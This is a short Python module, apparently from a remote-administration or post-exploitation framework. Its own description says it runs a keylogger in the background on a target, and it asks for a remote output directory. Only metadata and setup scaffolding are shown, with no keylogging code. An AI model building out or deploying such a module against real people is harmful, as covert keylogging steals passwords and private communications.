# -*- coding: utf-8 -*-
__author__ = "pand3mic"
__license__ = "GPLv3"

from server.modules.helper import *
import os

class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["pand3mic"],
            "Description": "Runs a keylogger in the background.",
            "References": [],
            # Should Stoppable be set to true or false?
            "Stoppable": False
        }
    
    def get_setup_messages(self):
        return [
            "Remote output directory (Leave empty to not output to a file): "
        ]

    def setup(self, set_options):
        output_file = set_options[1]

        return True, {
            "output_file": output_file
        }
